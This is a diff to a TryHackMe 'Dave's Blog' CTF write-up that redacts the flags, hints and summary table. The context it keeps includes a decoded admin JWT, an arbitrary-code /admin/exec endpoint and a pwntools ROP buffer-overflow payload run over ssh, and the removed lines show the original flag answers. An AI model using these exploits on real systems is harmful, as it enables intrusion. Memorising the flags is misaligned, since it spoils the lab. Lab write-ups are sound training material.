@@ -6,22 +6,12 @@ My friend Dave made his own blog! You should go check it out.
 
 This is a comprehensive writeup for the **Dave's Blog** room on TryHackMe - a Hard-difficulty CTF challenge that combines web exploitation, NoSQL injection, Node.js RCE, MongoDB enumeration, and binary exploitation with buffer overflow techniques.
 
----
-
-## Table of Contents
-
-1. [Flag 1 - NoSQL Injection](#flag-1---nosql-injection)
-2. [Flag 2 / User Flag - Remote Code Execution](#flag-2--user-flag---remote-code-execution)
-3. [Flag 3 - MongoDB Enumeration](#flag-3---mongodb-enumeration)
-4. [Flag 4 - Binary String Analysis](#flag-4---binary-string-analysis)
-5. [Flag 5 / Root Flag - Buffer Overflow & ROP](#flag-5--root-flag---buffer-overflow--rop)
 
 ---
 
 ## Flag 1 - NoSQL Injection
 
-### Hint
-What's there to inject when there's no SQL?
+
 
 ### Services Enumeration
 
@@ -112,7 +102,7 @@ jwt="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc0FkbWluIjp0cnVlLCJfaWQiOiI1ZWM2ZT
 for j in $jwt; do echo "$j" | base64 -d; done
 
 {"alg":"HS256","typ":"JWT"}
-{"isAdmin":true,"_id":"5ec6e5cf1dc4d364bf864107","username":"dave","password":"THM{SuperSecureAdminPassword123}","__v":0,"iat":1600844704}
+{"isAdmin":true,"_id":"5ec6e5cf1dc4d364bf864107","username":"dave","password":"===FLAG 1===","__v":0,"iat":1600844704}
 ```
 
 
@@ -126,7 +116,7 @@ Exploit the Node.js application for RCE.
 
 ### Authentication & RCE Exploitation
 
-With the credentials `dave:THM{SuperSecureAdminPassword123}`, we can now access the admin panel. The application allows command execution through a vulnerable endpoint.
+With the credentials `==FLAG 1===`, we can now access the admin panel. The application allows command execution through a vulnerable endpoint.
 
 The vulnerable endpoint at `/admin/exec` allows executing arbitrary Node.js code. Initial attempts with the `exec` method fail:
 
@@ -183,14 +173,9 @@ Navigate to the user's home directory and read the user flag:
 
 ```bash
 dave@daves-blog:~$ cat user.txt
-THM{5fa1f779d1835367fdcfa4741bebb88a}
+THM{==FLAG2==}
 ```
 
-### Flag 2 / User Flag
-
-```
-THM{5fa1f779d1835367fdcfa4741bebb88a}
-```
 
 ---
 
@@ -257,16 +242,12 @@ The `whatcouldthisbes` collection looks interesting:
 > db.whatcouldthisbes.find().pretty()
 {
     "_id" : ObjectId("5ec6e5cf1dc4d364bf864108"),
-    "whatCouldThisBe" : "THM{993e107fc66844482bb5dd0e4c485d5b}",
+    "whatCouldThisBe" : "THM{===FLAG3===}",
     "__v" : 0
 }
 ```
 
-### Flag 3
 
-```
-THM{993e107fc66844482bb5dd0e4c485d5b}
-```
 
 ---
 
@@ -314,23 +295,17 @@ Welcome to the UID checker!
 Enter 1 to check your UID or enter 2 to check your GID
 Your UID is: %d
 Your GID is: %d
-THM{runn1ng_str1ngs_1s_b4sic4lly_RE}
+THM{===FLAG4===}
 Wow! You found the secret function! I still need to finish it..
 Invalid choice
 ```
 
-### Flag 4
-
-```
-THM{runn1ng_str1ngs_1s_b4sic4lly_RE}
-```
 
 ---
 
 ## Flag 5 / Root Flag - Buffer Overflow & ROP
 
-### Hint
-from pwn import *
+
 
 ### Binary Analysis
 
@@ -419,7 +394,7 @@ payload += p64(0x400803) # pop rdi; ret
 payload += p64(0x601060) # [arg0] rdi = 6295648
 payload += p64(0x400570)
 
-s = ssh(host='TARGET_IP', user='dave', password='THM{SuperSecureAdminPassword123}')
+s = ssh(host='TARGET_IP', user='dave', password='THM{===FLAG1===}')
 p = s.process(['sudo', '/uid_checker'])
 print(p.recv())
 p.sendline(payload)
@@ -454,26 +429,12 @@ drwxr-xr-x 24 root root 4096 May 21 20:28 ..
 -rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
 -r--------  1 root root   38 May 21 20:57 root.txt
 # $ cat root.txt
-THM{a0a9c4f6809c84e212ac889d39b9cb48}
+THM{===FLAG5===}
 ```
 
-### Flag 5 / Root Flag
-
-```
-THM{a0a9c4f6809c84e212ac889d39b9cb48}
-```
 
 ---
 
-## Summary of All Flags
-
-| Flag | Value |
-|------|-------|
-| **Flag 1** | `THM{SuperSecureAdminPassword123}` |
-| **Flag 2 (User)** | `THM{5fa1f779d1835367fdcfa4741bebb88a}` |
-| **Flag 3** | `THM{993e107fc66844482bb5dd0e4c485d5b}` |
-| **Flag 4** | `THM{runn1ng_str1ngs_1s_b4sic4lly_RE}` |
-| **Flag 5 (Root)** | `THM{a0a9c4f6809c84e212ac889d39b9cb48}` |
 
 ---
 
